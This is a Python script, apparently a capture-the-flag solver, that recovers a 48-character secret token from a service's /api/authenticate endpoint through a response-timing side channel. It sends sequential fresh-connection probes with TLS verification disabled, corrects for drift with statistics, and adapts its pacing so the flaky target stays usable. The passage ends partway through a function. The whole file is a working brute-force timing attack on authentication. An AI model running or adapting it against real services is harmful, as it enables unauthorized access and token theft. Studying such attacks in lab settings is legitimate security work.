#!/usr/bin/env python3
"""Recover the NeuroServe token with a fresh-connection timing side channel.

The target keeps per-connection state and suppresses the useful timing signal
on reused connections.  Consequently every authentication probe creates a
new ``requests.Session`` and sends ``Connection: close``.  Probes are strictly
sequential; adaptive start-to-start cadence and retry backoff keep the flaky
instance usable without hiding the signal behind connection reuse or queues.
"""

from __future__ import annotations

import argparse
from collections import deque
import json
import math
import os
import random
import statistics
import string
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Callable

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TOKEN_LENGTH = 48
CHARSET = string.digits + string.ascii_lowercase + string.ascii_uppercase
DEFAULT_STATE = Path(__file__).with_name("state.json")
CADENCE_WINDOW = 12
CADENCE_MIN = 3.0
CADENCE_MAX = 15.0
IMPACT_MIN_INTERVAL = 2.5
# Race mode trades extra queue/load risk for speed during a proven healthy
# window: it is the only path allowed below the normal 2.5s request floor.
RACE_MIN_INTERVAL = 1.2
RACE_DELAY = 1.6
RACE_MAX_DELAY = 4.0
HEALTH_PULSE_ATTEMPTS = 30
HEALTH_PULSE_INTERVAL = 180.0
HEALTH_PULSE_PAUSE = 600.0
DEEP_SAMPLE_ROUNDS = 10
DEEP_MIN_ELEVATED_RATE = 0.20
DEEP_MIN_RATE_CONTRAST = 0.15
ANCHOR_CHAR = "q"
ANCHOR_INTERVAL = 12


class TokenFound(Exception):
    def __init__(self, token: str, response_text: str = ""):
        super().__init__(token)
        self.token = token
        self.response_text = response_text


class InstanceOffline(RuntimeError):
    """Both the authentication and health endpoints returned 404."""


class SelfHealingFailure(RuntimeError):
    """The periodic known-good-position check no longer sees its signal."""


class NoWinner(RuntimeError):
    """Neither screening pass produced a statistically clear candidate."""

    def __init__(
        self,
        message: str,
        *,
        best_z: float | None = None,
        baseline: float | None = None,
    ):
        super().__init__(message)
        self.best_z = best_z
        self.baseline = baseline


class WatchExpired(RuntimeError):
    """The optional no-signal watch window elapsed."""


@dataclass
class ClientConfig:
    delay: float = CADENCE_MIN
    min_delay: float = CADENCE_MIN
    max_delay: float = CADENCE_MAX
    max_retries: int = 12
    timeout: float = 15.0
    # Kept for callers of the previous API; retry pacing is intentionally
    # fixed in _retry and does not consult this compatibility field.
    backoff: float = 0.8


@dataclass(frozen=True)
class AttemptSample:
    status: int | None
    latency_ms: float | None


@dataclass(frozen=True)
class DriftCurve:
    """Piecewise-linear estimate of the baseline at a probe timestamp."""

    anchors: tuple[tuple[float, float], ...]

    def at(self, timestamp: float) -> float:
        if not self.anchors:
            return 0.0
        if len(self.anchors) < 2:
            return self.anchors[0][1]
        if timestamp <= self.anchors[0][0]:
            return self.anchors[0][1]
        if timestamp >= self.anchors[-1][0]:
            return self.anchors[-1][1]
        for (left_time, left_value), (right_time, right_value) in zip(
            self.anchors, self.anchors[1:]
        ):
            if timestamp <= right_time:
                span = right_time - left_time
                if span <= 0:
                    return right_value
                fraction = (timestamp - left_time) / span
                return left_value + fraction * (right_value - left_value)
        return self.anchors[-1][1]


@dataclass(frozen=True)
class ScreeningPass:
    scores: list[tuple[float, str]]
    baseline: float
    sigma: float
    probes: int
    drift: DriftCurve

    def adjusted_at(self, raw_score: float, timestamp: float) -> float:
        return raw_score - self.drift.at(timestamp)


class InfraMonitor:
    """Classify the target from the auth responses already collected."""

    def __init__(self, window_size: int = CADENCE_WINDOW):
        self.window: deque[AttemptSample] = deque(maxlen=window_size)
        self.state = "UNKNOWN"
        self.consecutive_502 = 0
        self.best_median_ms: float | None = None
        self.latency_floor: float | None = None
        self.storm_started_at: float | None = None

    @property
    def success_rate(self) -> float:
        if not self.window:
            return 0.0
        successes = sum(sample.status in (200, 401) for sample in self.window)
        return successes / len(self.window)

    @property
    def storm_rate(self) -> float:
        if not self.window:
            return 0.0
        return sum(sample.status == 502 for sample in self.window) / len(self.window)

    def _successful_median(self) -> float | None:
        values = [
            sample.latency_ms
            for sample in self.window
            if sample.status in (200, 401)
            and sample.latency_ms is not None
            and math.isfinite(sample.latency_ms)
        ]
        return statistics.median(values) if values else None

    def mark_down(self) -> None:
        self.state = "DOWN"

    def observe(
        self,
        status: int | None,
        latency_ms: float | None,
    ) -> str:
        previous = self.state
        self.window.append(AttemptSample(status, latency_ms))
        if status == 502:
            self.consecutive_502 += 1
        else:
            self.consecutive_502 = 0

        if previous == "STORM" and status in (200, 401):
            self.state = "RECOVERING"
            return self.state

        storm = (
            len(self.window) >= CADENCE_WINDOW and self.storm_rate >= 0.5
        ) or self.consecutive_502 >= 4
        if storm:
            if previous != "STORM":
                self.storm_started_at = time.monotonic()
            self.state = "STORM"
            return self.state

        median_ms = self._successful_median()
        if median_ms is not None:
            if self.best_median_ms is None or median_ms < self.best_median_ms:
                self.best_median_ms = median_ms
            healthy_latency = median_ms <= 2.0 * self.best_median_ms
            if self.success_rate >= 0.85 and healthy_latency:
                self.state = "HEALTHY"
                if status in (200, 401) and latency_ms is not None:
                    if self.latency_floor is None:
                        self.latency_floor = latency_ms
                    else:
                        # Slow adaptation keeps the floor useful while the
                        # target's normal response time drifts.
                        self.latency_floor = (
                            0.2 * latency_ms + 0.8 * self.latency_floor
                        )
                return self.state

        self.state = "UNKNOWN" if previous == "RECOVERING" else previous
        return self.state

    def relative_latency(self, latency_ms: float) -> float:
        """Put timing scores on a session-relative, floor-adjusted baseline."""
        if self.latency_floor is None:
            return latency_ms
        return latency_ms - self.latency_floor


class ResilientClient:
    """Strictly sequential client with fresh TCP+TLS connections per probe."""

    def __init__(self, url: str, config: ClientConfig):
        base_url = url.rstrip("/")
        self.endpoint = base_url + "/api/authenticate"
        self.health_endpoint = base_url + "/health"
        self.config = config
        # Keep the compatibility CLI bounds, but never let the controller
        # leave the requested 3-15 second operating range.
        self.normal_cadence_min = max(CADENCE_MIN, config.min_delay)
        self.normal_cadence_max = min(CADENCE_MAX, config.max_delay)
        if self.normal_cadence_max < self.normal_cadence_min:
            self.normal_cadence_max = self.normal_cadence_min
        self.cadence_min = self.normal_cadence_min
        self.cadence_max = self.normal_cadence_max
        self.impact_min_interval = IMPACT_MIN_INTERVAL
        self.delay = min(self.cadence_max, max(self.cadence_min, config.delay))
        self._next_request_at = 0.0
        self._last_request_at: float | None = None
        self._consecutive_wave_failures = 0
        self.monitor = InfraMonitor()
        self.completed_auth_requests = 0
        self._auth_since_pulse = 0
        self._last_pulse_at = time.monotonic()
        self._pulse_suppressed_until = 0.0
        self._health_502_streak = 0
        self._congested = False
        self._clean_pulses = 0
        self.race_mode = False
        self.strong_pick_streak = 0
        self._consecutive_transport_errors = 0

    @property
    def latency_floor(self) -> float | None:
        return self.monitor.latency_floor

    @staticmethod
    def _fresh_session() -> requests.Session:
        session = requests.Session()
        session.verify = False
        return session

    def _wait_for_cadence(self) -> None:
        """Wait for the next slot, including the current impact floor."""
        next_allowed = self._next_request_at
        if self._last_request_at is not None:
            next_allowed = max(
                next_allowed,
                self._last_request_at + self.impact_min_interval,
            )
        remaining = next_allowed - time.monotonic()
        if remaining > 0:
            time.sleep(remaining)

    def _reserve_request_slot(self, started_at: float) -> None:
        self._last_request_at = started_at
        self._next_request_at = started_at + max(
            self.delay, self.impact_min_interval
        )

    def _race_mode_off(self, reason: str) -> None:
        if not self.race_mode:
            return
        self.race_mode = False
        self.cadence_min = self.normal_cadence_min
        self.cadence_max = self.normal_cadence_max
        self.impact_min_interval = IMPACT_MIN_INTERVAL
        self.delay = min(
            self.cadence_max,
            max(self.cadence_min, self.delay),
        )
        print(f"[infra] RACE MODE OFF {reason}", flush=True)

    def record_pick(self, delta_ms: float, z: float) -> None:
        """Feed an accepted position into the healthy-window race controller."""
        if not (math.isfinite(delta_ms) and math.isfinite(z)):
            self.strong_pick_streak = 0
            self._race_mode_off("reason=non-finite pick")
            return
        if delta_ms >= 60.0 and z >= 10.0:
            self.strong_pick_streak += 1
            if self.strong_pick_streak >= 2 and not self.race_mode:
                self.race_mode = True
                self.cadence_min = RACE_MIN_INTERVAL
                self.cadence_max = RACE_MAX_DELAY
                self.impact_min_interval = RACE_MIN_INTERVAL
                self.delay = RACE_DELAY
                print("[infra] RACE MODE ON - window open", flush=True)
            return
        self.strong_pick_streak = 0
        if self.race_mode and z < 8.0:
            self._race_mode_off(f"reason=pick z={z:.2f}")

    def _record_attempt(
        self,
        status: int | None,
        latency_ms: float | None,
        started_at: float,
    ) -> str:
        """Update infra state and adaptive cadence for one auth response."""
        state = self.monitor.observe(status, latency_ms)
        self.completed_auth_requests += 1
        self._auth_since_pulse += 1
        if status is None:
            self._consecutive_transport_errors += 1
        else:
            self._consecutive_transport_errors = 0
        if self._consecutive_transport_errors >= 3:
            self._race_mode_off("reason=3 consecutive transport errors")

        success_rate = self.monitor.success_rate
        if self._congested:
            self.delay = self.cadence_max
        elif success_rate < 0.70:
            self.delay = min(self.cadence_max, self.delay * 1.3)
        elif success_rate > 0.90:
            self.delay = max(self.cadence_min, self.delay * 0.85)
        # A changed target applies to the next start, without adding response
        # time to the cadence when the slot has already elapsed.
        self._next_request_at = max(
            self._next_request_at,
            started_at + max(self.delay, self.impact_min_interval),
        )
        return state

    def _post_auth(
        self,
        token: str,
    ) -> tuple[float, requests.Response | None, float, requests.RequestException | None]:
        """POST once on a fresh connection; caller chooses retry policy."""
        self._wait_for_cadence()
        started_at = time.monotonic()
        started_ns = time.perf_counter_ns()
        self._reserve_request_slot(started_at)
        try:
            with self._fresh_session() as session:
                response = session.post(
                    self.endpoint,
                    json={"token": token},
                    headers={"Connection": "close"},
                    timeout=self.config.timeout,
                )
        except requests.RequestException as exc:
            elapsed_ms = (time.perf_counter_ns() - started_ns) / 1_000_000
            return elapsed_ms, None, started_at, exc
        elapsed_ms = (time.perf_counter_ns() - started_ns) / 1_000_000
        return elapsed_ms, response, started_at, None

    def _health_probe(self) -> tuple[int | None, float]:
        """Probe health with the same fresh-session and cadence guarantees."""
        self._wait_for_cadence()
        started_at = time.monotonic()
        started_ns = time.perf_counter_ns()
        self._reserve_request_slot(started_at)
        try:
            with self._fresh_session() as session:
                response = session.get(
                    self.health_endpoint,
                    headers={"Connection": "close"},
                    timeout=min(self.config.timeout, 8.0),
                )
            return response.status_code, (time.perf_counter_ns() - started_ns) / 1_000_000
        except requests.RequestException:
            return None, (time.perf_counter_ns() - started_ns) / 1_000_000

    def _maybe_health_pulse(self) -> None:
        now = time.monotonic()
        if now < self._pulse_suppressed_until:
            return
        if (
            self._auth_since_pulse < HEALTH_PULSE_ATTEMPTS
            and now - self._last_pulse_at < HEALTH_PULSE_INTERVAL
        ):
            return

        status, elapsed_ms = self._health_probe()
        self._last_pulse_at = time.monotonic()
        self._auth_since_pulse = 0
        status_text = "ERR" if status is None else str(status)
        print(f"[pulse] health={status_text} {elapsed_ms:.0f}ms", flush=True)

        if status == 502:
            self._health_502_streak += 1
            if self._health_502_streak >= 2:
                self._pulse_suppressed_until = time.monotonic() + HEALTH_PULSE_PAUSE
                self._health_502_streak = 0
                print("[pulse] health=502 -> paused 600s", flush=True)
        else:
            self._health_502_streak = 0

        floor = self.latency_floor
        congested = (
            status == 200
            and floor is not None
            and floor > 0
            and elapsed_ms > 3.0 * floor
        )
        if congested:
            self._congested = True
            self._clean_pulses = 0
            self.delay = self.cadence_max
        elif status == 200 and self._congested:
            self._clean_pulses += 1
            if self._clean_pulses >= 2:
                self._congested = False
                self._clean_pulses = 0
                print("[pulse] congestion cleared after 2 clean pulses", flush=True)

    def _health_status(self) -> int | None:
        """Check health once, without making health a gate for auth retries."""
        status, _ = self._health_probe()
        return status

    def _run_breaker(
        self,
        token: str,
        storm_rate: float,
    ) -> tuple[float, requests.Response]:
        """Wait, then send only one canary at each exponentially spaced slot."""
        self._race_mode_off("reason=breaker trip")
        storm_started = self.monitor.storm_started_at or time.monotonic()
        wait_time = 45.0
        print(
            f"[infra] STORM (rate={storm_rate:.2f}) -> breaker 45s",
            flush=True,
        )
        while True:
            time.sleep(wait_time)
            elapsed_ms, response, started_at, error = self._post_auth(token)
            if error is not None:
                self._next_request_at = max(
                    self._next_request_at,
                    started_at + max(self.delay, self.impact_min_interval),
                )
                print(
                    f"[infra] canary network error -> breaker "
                    f"{min(240.0, wait_time * 1.6):.0f}s",
                    flush=True,
                )
                wait_time = min(240.0, wait_time * 1.6)
                continue

            assert response is not None
            self._record_attempt(response.status_code, elapsed_ms, started_at)
            if response.status_code in (200, 401):
                recovered_for = time.monotonic() - storm_started
                print(
                    f"[infra] recovered after {recovered_for:.1f}s "
                    f"(canary ok, {elapsed_ms:.0f}ms)",
                    flush=True,
                )
                return elapsed_ms, response

            if response.status_code == 404 and self._health_status() == 404:
                self.monitor.mark_down()
                raise InstanceOffline(
                    "/api/authenticate and /health both returned 404; "
                    "restart the challenge instance."
                )

            next_wait = min(240.0, wait_time * 1.6)
            print(
                f"[infra] canary HTTP {response.status_code} -> breaker "
                f"{next_wait:.0f}s",
                flush=True,
            )
            wait_time = next_wait

    def _retry(
        self,
        attempt: int,
        detail: str,
        started_at: float,
        request_number: int,
        *,
        wave: bool = False,
    ) -> bool:
        if wave:
            # The first wave response uses only the learned cadence.  Once a
            # wave is established, wait 20, 30, ... seconds between attempts.
            if self._consecutive_wave_failures < 2:
                wait_time = 0.0
            else:
                wait_time = min(
                    20.0 + (self._consecutive_wave_failures - 2) * 10.0,
                    60.0,
                )
            retry_text = (
                f"wave hold {wait_time:.0f}s"
                if wait_time
                else f"wave watch; cadence {self.delay:.2f}s"
            )
        else:
            # Connection/socket failures are generally local and recover
            # quickly, so retain a small 1-3 second retry backoff.
            wait_time = min(3.0, max(1.0, float(attempt)))
            retry_text = f"retrying in {wait_time:.1f}s"

        self._next_request_at = max(
            started_at + max(self.delay, self.impact_min_interval),
            time.monotonic() + wait_time,
        )
        print(
            f"  [{detail}] {retry_text}, cadence -> {self.delay:.2f}s "
            f"({attempt}/{self.config.max_retries})...",
            flush=True,
        )
        return False

    def send_auth(self, token: str) -> tuple[float, requests.Response]:
        """Send one logical probe, retrying transient failures sequentially.

        Each attempt is a separate fresh connection.  A 404 is fatal only
        when the independent health request also returns 404; health 502s,
        network failures, and all other non-200/401 auth statuses are retried.
        """
        request_number = 0
        retry_attempt = 0
        while request_number < self.config.max_retries:
            self._maybe_health_pulse()
            request_number += 1
            elapsed_ms, response, started_at, error = self._post_auth(token)
            if error is not None:
                retry_attempt += 1
                self._record_attempt(None, elapsed_ms, started_at)
                self._retry(
                    retry_attempt,
                    f"Network Error: {error.__class__.__name__}",
                    started_at,
                    request_number,
                )
                continue

            assert response is not None
            self._record_attempt(response.status_code, elapsed_ms, started_at)
            if response.status_code in (200, 401):
                self._consecutive_wave_failures = 0
                return elapsed_ms, response

            retry_attempt += 1
            if response.status_code == 404 and self._health_status() == 404:
                self.monitor.mark_down()
                raise InstanceOffline(
                    "/api/authenticate and /health both returned 404; "
                    "restart the challenge instance."
                )

            if self.monitor.state == "STORM":
                self._race_mode_off("reason=breaker trip")
                return self._run_breaker(token, self.monitor.storm_rate)

            is_wave = response.status_code in (502, 503)
            if is_wave:
                self._consecutive_wave_failures += 1
            self._retry(
                retry_attempt,
                f"HTTP {response.status_code}",
                started_at,
                request_number,
                wave=is_wave,
            )

        raise RuntimeError(
            f"No valid response after {self.config.max_retries} attempts "
            f"for token={token!r}"
        )


def load_state(path: Path, url: str) -> dict[str, Any]:
    defaults: dict[str, Any] = {
        "url": url.rstrip("/"),
        "recovered": "",
        "positions": [],
        "evidence": {},
        "cadence": None,
        "winner_delta_band": [],
    }
    if not path.exists():
        return defaults
    try:
        state = json.loads(path.read_text())
    except (OSError, json.JSONDecodeError) as exc:
        print(f"Warning: cannot read state file {path}: {exc}. Starting fresh.")
        return defaults
    if not isinstance(state, dict):
        print(f"Warning: state file {path} is not an object. Starting fresh.")
        return defaults
    for key, value in defaults.items():
        if key not in state:
            state[key] = value.copy() if isinstance(value, (dict, list)) else value
    if not isinstance(state.get("evidence"), dict):
        state["evidence"] = {}
    if not state.get("winner_delta_band"):
        # Migrate the old raw-ms band when its per-position baselines are
        # available.  This keeps history useful under changing server load.
        migrated: list[float] = []
        positions = state.get("positions")
        if isinstance(positions, list):
            for entry in positions:
                if not isinstance(entry, dict):
                    continue
                try:
                    delta = float(entry["median_ms"]) - float(entry["baseline_ms"])
                except (KeyError, TypeError, ValueError):
                    continue
                if math.isfinite(delta):
                    migrated.append(round(delta, 2))
        state["winner_delta_band"] = migrated
    return state


def save_state(path: Path, state: dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    temp = path.with_suffix(path.suffix + ".tmp")
    # Write and flush the complete document before replacing the old one.  A
    # probe may take a long time, so a killed process must leave a parseable
    # state file containing the last accepted position.
    with temp.open("w", encoding="utf-8") as handle:
        json.dump(state, handle, indent=2)
        handle.write("\n")
        handle.flush()
        os.fsync(handle.fileno())
    os.replace(temp, path)


def candidate(prefix: str, char: str) -> str:
    return prefix + char + ("0" * (TOKEN_LENGTH - len(prefix) - 1))


def probe_once_timed(
    client: ResilientClient,
    prefix: str,
    char: str,
) -> tuple[float, float]:
    """Run one probe and return its relative latency and start timestamp."""
    timestamp = time.monotonic()
    token = candidate(prefix, char)
    elapsed, response = client.send_auth(token)
    if response.status_code == 200:
        print(f"\n[SUCCESS] Token Found: {token}")
        print(f"[+] Response: {response.text}")
        raise TokenFound(token, response.text)
    return client.monitor.relative_latency(elapsed), timestamp


def probe_once(client: ResilientClient, prefix: str, char: str) -> float:
    """Run one sequential fresh-connection probe."""
    score, _timestamp = probe_once_timed(client, prefix, char)
    return score


def fit_drift_curve(anchors: list[tuple[float, float]]) -> DriftCurve:
    """Fit a piecewise-linear curve through timestamped anchor medians."""
    grouped: dict[float, list[float]] = {}
    for timestamp, latency in anchors:
        if math.isfinite(timestamp) and math.isfinite(latency):
            grouped.setdefault(float(timestamp), []).append(float(latency))
    medians = tuple(
        (timestamp, statistics.median(values))
        for timestamp, values in sorted(grouped.items())
    )
    return DriftCurve(medians)


def batch_statistics(
    scores: list[tuple[float, str]],
    *,
    exclude_top_k: int = 2,
) -> tuple[float, float]:
    """Return (median, MAD sigma), excluding top scores from noise estimation."""
    if not scores:
        raise NoWinner("cannot screen an empty charset")
    values = [float(score) for score, _ in scores]
    baseline = statistics.median(values)
    excluded = {
        index
        for index, _value in sorted(
            enumerate(values), key=lambda item: item[1], reverse=True
        )[: max(0, min(exclude_top_k, len(values)))]
    }
    noise_values = [value for index, value in enumerate(values) if index not in excluded]
    deviations = [abs(value - baseline) for value in noise_values]
    mad = statistics.median(deviations) if deviations else 0.0
    sigma = mad * 1.4826
    if not math.isfinite(baseline) or not math.isfinite(sigma):
        raise NoWinner("screening batch produced non-finite timing statistics")
    return baseline, sigma


def z_score(value: float, baseline: float, sigma: float) -> float:
    """Return a candidate's robust, batch-relative timing score."""
    if not all(math.isfinite(number) for number in (value, baseline, sigma)):
        raise NoWinner("non-finite timing value cannot be scored")
    # A zero MAD is possible when a tiny batch happens to have identical
    # timings.  Keep the score relative while avoiding a floating-point
    # division by zero; any non-zero deviation is then unambiguously large.
    denominator = max(sigma, 1e-9)
    return (value - baseline) / denominator


def artifact_guard_accepts(
    phase_one_z: float,
    reprobes: list[float],
    baseline: float,
    sigma: float,
    *,
    outlier_z: float = 8.0,
    required_reprobe_z: float = 4.0,
) -> bool:
    """Return whether a phase-one outlier survives two guard probes."""
    if phase_one_z < outlier_z:
        return True
    return bool(reprobes) and all(
        z_score(value, baseline, sigma) >= required_reprobe_z
        for value in reprobes
    )


def sprt_decision(
    samples: list[float],
    baseline: float,
    delta: float,
    sigma: float,
    *,
    max_samples: int = 12,
) -> tuple[str, int, float]:
    """Classify a constant positive timing shift with the solver's SPRT."""
    if sigma <= 0 or not math.isfinite(sigma):
        raise ValueError("sigma must be positive and finite")
    threshold_win = math.log(0.98 / 0.02)
    threshold_lose = math.log(0.02 / 0.98)
    llr = 0.0
    for number, value in enumerate(samples[:max_samples], start=1):
        x = float(value) - baseline
        log_signal = -0.5 * ((x - delta) / sigma) ** 2
        log_null = -0.5 * ((x / sigma) ** 2)
        llr += log_signal - log_null
        if llr >= threshold_win:
            return "accept", number, llr
        if llr <= threshold_lose:
            return "reject", number, llr
    return "undecided", min(len(samples), max_samples), llr


def deep_rate_decision(
    samples: dict[str, list[float]],
    baseline: float,
    sigma: float,
    *,
    rounds: int = DEEP_SAMPLE_ROUNDS,
    min_elevated_rate: float = DEEP_MIN_ELEVATED_RATE,
    min_rate_contrast: float = DEEP_MIN_RATE_CONTRAST,
) -> tuple[str, float, float, float] | None:
    """Find a suspect by elevated-rate contrast, tolerating intermittent signal."""
    threshold = baseline + max(25.0, 3.0 * sigma)
    summaries: list[tuple[str, float, float, float]] = []
    for char, values in samples.items():
        values = list(values[:rounds])
        if not values:
            continue
        elevated = [value for value in values if value > threshold]
        summaries.append(
            (
                char,
                len(elevated) / len(values),
                statistics.median(values),
                statistics.median(elevated) if elevated else baseline,
            )
        )
    if not summaries:
        return None
    winner, rate, _median, elevated_median = max(
        summaries, key=lambda item: (item[1], item[3])
    )
    other_rates = [item[1] for item in summaries if item[0] != winner]
    if rate < min_elevated_rate or (
        other_rates and rate - max(other_rates) < min_rate_contrast
    ):
        return None
    return winner, rate, elevated_median, threshold


def screening_baseline(scores: list[tuple[float, str]], top_k: int = 3) -> float:
    """Compatibility helper: the screening baseline is the full-batch median."""
    del top_k
    return batch_statistics(scores)[0]


def upsert_position(state: dict[str, Any], entry: dict[str, Any]) -> None:
    """Replace a position record rather than appending duplicate records."""
    position = entry.get("position")
    positions = state.get("positions")
    if not isinstance(positions, list):
        positions = []
    state["positions"] = [
        old
        for old in positions
        if not (isinstance(old, dict) and old.get("position") == position)
    ]
    state["positions"].append(entry)


def normalise_positions(state: dict[str, Any], recovered: str) -> None:
    """Remove malformed/out-of-progress and duplicate position records."""
    positions = state.get("positions")
    if not isinstance(positions, list):
        state["positions"] = []
        return
    by_position: dict[int, dict[str, Any]] = {}
    for entry in positions:
        if not isinstance(entry, dict):
            continue
        try:
            position = int(entry["position"])
        except (KeyError, TypeError, ValueError):
            continue
        if 1 <= position <= len(recovered):
            by_position[position] = entry
    state["positions"] = [by_position[position] for position in sorted(by_position)]


def recover(
    url: str,
    *,
    config: ClientConfig,
    state_path: Path,
    positions: int,
    verify_samples: int,
    accept_margin: float,
    charset: str,
    rescreen_every: int,
    top_m: int = 4,
    verbose: bool = False,
    watch: bool = False,
    watch_hours: float = 12.0,
    client_factory: Callable[[str, ClientConfig], Any] | None = None,
) -> str:
    # Retained in the function signature for state/CLI compatibility.  All
    # acceptance decisions now use the live batch's relative z-score.
    del accept_margin
    del verify_samples
    if not charset:
        raise NoWinner("charset is empty; there are no candidates to probe")
    if top_m < 1:
        raise ValueError("top_m must be at least 1")
    if watch_hours <= 0:
        raise ValueError("watch_hours must be positive")

    state = load_state(state_path, url)
    recovered = str(state.get("recovered", ""))
    normalise_positions(state, recovered)
    if state.get("cadence") is not None:
        try:
            config.delay = min(
                CADENCE_MAX,
                max(CADENCE_MIN, float(state["cadence"])),
            )
        except (TypeError, ValueError):
            pass

    client = (client_factory or ResilientClient)(url, config)
    screen_rng = random.Random()
    limit = min(positions, TOKEN_LENGTH)
    accepted_since_check = -1

    print(f"[*] Target Endpoint: {client.endpoint}")
    print(f"[*] Token Length: {TOKEN_LENGTH}; Charset Size: {len(charset)}")
    print(f"[*] Current Progress: {recovered!r} ({len(recovered)}/{TOKEN_LENGTH})")
    print(
        f"[*] Fresh sequential cadence: start {client.delay:.2f}s; "
        f"State File: {state_path}"
    )

    def persist() -> None:
        state["cadence"] = round(client.delay, 3)
        save_state(state_path, state)

    def update_evidence(
        position: int,
        scores: list[tuple[float, str]],
        baseline: float,
        sigma: float,
    ) -> None:
        """Accumulate this screening pass before any ranking can discard it."""
        evidence = state.setdefault("evidence", {})
        if not isinstance(evidence, dict):
            evidence = {}
            state["evidence"] = evidence
        position_key = str(position)
        position_evidence = evidence.setdefault(position_key, {})
        if not isinstance(position_evidence, dict):
            position_evidence = {}
            evidence[position_key] = position_evidence
        threshold = baseline + max(25.0, 3.0 * sigma)
        for score, char in scores:
            record = position_evidence.setdefault(
                char,
                {"n": 0, "elev": 0, "sum_ms": 0.0},
            )
            if not isinstance(record, dict):
                record = {"n": 0, "elev": 0, "sum_ms": 0.0}
                position_evidence[char] = record
            try:
                n = int(record.get("n", 0))
                elev = int(record.get("elev", 0))
                sum_ms = float(record.get("sum_ms", 0.0))
            except (TypeError, ValueError):
                n, elev, sum_ms = 0, 0, 0.0
            if n < 0 or elev < 0 or not math.isfinite(sum_ms):
                n, elev, sum_ms = 0, 0, 0.0
            record["n"] = n + 1
            record["elev"] = elev + int(score > threshold)
            record["sum_ms"] = sum_ms + float(score)

    def historical_prime_suspects(position: int) -> list[str]:
        evidence = state.get("evidence")
        position_evidence = evidence.get(str(position), {}) if isinstance(evidence, dict) else {}
        if not isinstance(position_evidence, dict):
            return []
        primes: list[str] = []
        for char, raw_record in position_evidence.items():
            if not isinstance(char, str) or not isinstance(raw_record, dict):
                continue
            try:
                n = int(raw_record.get("n", 0))
                elev = int(raw_record.get("elev", 0))
            except (TypeError, ValueError):
                continue
            rate = elev / n if n else 0.0
            if n >= 8 and elev >= 3 and rate >= 0.25:
                primes.append(char)
                print(
                    f"[hist] cand={char!r} rate={rate:.2f} "
                    f"elev={elev}/{n} -> promoting",
                    flush=True,
                )
        return primes

    def record_success(exc: TokenFound) -> str:
        """Persist a 200 response before returning from any probe phase."""
        state["recovered"] = exc.token
        state["response_text"] = exc.response_text
        persist()
        print(f"\n[FLAG?] Server accepted: {exc.token}\n{exc.response_text}")
        return exc.token

    def screen_one_pass(
        prefix: str,
        label: str,
    ) -> ScreeningPass:
        order = list(charset)
        screen_rng.shuffle(order)
        raw_samples: list[tuple[float, str, float]] = []
        anchors: list[tuple[float, float]] = []
        probes = 0
        for index, char in enumerate(order, start=1):
            print(f"[screen {index}/{len(order)}] cand={char!r}", flush=True)
            raw_score, timestamp = probe_once_timed(client, prefix, char)
            raw_samples.append((raw_score, char, timestamp))
            probes += 1
            if verbose:
                print(
                    f"  [screen {index}/{len(order)}] raw={raw_score:.2f}ms",
                    flush=True,
                )
            if index % ANCHOR_INTERVAL == 0:
                print(
                    f"[anchor {index // ANCHOR_INTERVAL}] cand={ANCHOR_CHAR!r}",
                    flush=True,
                )
                anchor_score, anchor_timestamp = probe_once_timed(
                    client, prefix, ANCHOR_CHAR
                )
                anchors.append((anchor_timestamp, anchor_score))
                probes += 1

        drift = fit_drift_curve(anchors)
        scores = [
            (raw_score - drift.at(timestamp), char)
            for raw_score, char, timestamp in raw_samples
        ]
        baseline, sigma = batch_statistics(scores)
        update_evidence(len(prefix) + 1, scores, baseline, sigma)
        # Persist evidence immediately: a no-winner/watch cycle must not lose
        # the samples that make an intermittent signal promotable later.
        persist()
        if verbose:
            print(
                f"  [{label}] anchors={len(anchors)} baseline={baseline:.2f} "
                f"ms sigma={sigma:.2f} ms",
                flush=True,
            )
        return ScreeningPass(scores, baseline, sigma, probes, drift)

    def screen_position(
        prefix: str,
        label: str = "screening",
    ) -> list[ScreeningPass]:
        passes = [screen_one_pass(prefix, f"{label} pass-1")]
        if not bool(getattr(client, "race_mode", False)):
            passes.append(screen_one_pass(prefix, f"{label} pass-2"))
        else:
            print("  [screen] race mode: single pass", flush=True)
        return passes

    def live_adjusted_score(
        raw_score: float,
        timestamp: float,
        passes: list[ScreeningPass],
    ) -> float:
        if not passes:
            return raw_score
        drift = statistics.mean(screen.drift.at(timestamp) for screen in passes)
        return raw_score - drift

    def combine_passes(
        passes: list[ScreeningPass],
        historical_primes: list[str],
    ) -> tuple[
        list[tuple[float, str]],
        list[tuple[float, str]],
        dict[str, list[float]],
        float,
        float,
    ]:
        """Return all scores plus only candidates promoted by every pass."""
        samples: dict[str, list[float]] = {char: [] for char in charset}
        for screening in passes:
            for score, char in screening.scores:
                samples.setdefault(char, []).append(score)
        all_scores = [
            (statistics.median(values), char)
            for char, values in samples.items()
            if values
        ]
        baseline, sigma = batch_statistics(all_scores)
        elevated_sets: list[set[str]] = []
        for screening in passes:
            elevated_sets.append(
                {
                    char
                    for score, char in screening.scores
                    if (
                        z_score(score, screening.baseline, screening.sigma) >= 6.0
                        or score > screening.baseline + 25.0
                    )
                }
            )
        promoted = set.intersection(*elevated_sets) if elevated_sets else set()
        promoted.update(char for char in historical_primes if char in samples)
        leader_scores = [
            (score, char) for score, char in all_scores if char in promoted
        ]
        if not leader_scores:
            best_z = max(z_score(score, baseline, sigma) for score, _ in all_scores)
            raise NoWinner(
                "no candidate was elevated in every screening pass",
                best_z=best_z,
                baseline=baseline,
            )
        return all_scores, leader_scores, samples, baseline, sigma

    def artifact_guard(
        prefix: str,
        scores: list[tuple[float, str]],
        baseline: float,
        sigma: float,
        historical_primes: list[str],
        passes: list[ScreeningPass],
        promoted_leaders: set[str],
    ) -> tuple[list[tuple[float, str]], dict[str, list[float]], int]:
        """Re-probe every phase-1 outlier before allowing it to lead."""
        eligible: list[tuple[float, str]] = []
        guard_samples: dict[str, list[float]] = {}
        guard_probes = 0
        for score, char in sorted(
            scores,
            key=lambda item: z_score(item[0], baseline, sigma),
            reverse=True,
        ):
            phase_one_z = z_score(score, baseline, sigma)
            if phase_one_z < 8.0:
                eligible.append((score, char))
                continue

            reprobes = []
            for reprobe_number in range(1, 3):
                print(
                    f"[guard] re-probe {char!r} ({reprobe_number}/2)",
                    flush=True,
                )
                raw_score, timestamp = probe_once_timed(client, prefix, char)
                reprobes.append(live_adjusted_score(raw_score, timestamp, passes))
            guard_probes += 2
            reprobe_z = [z_score(value, baseline, sigma) for value in reprobes]
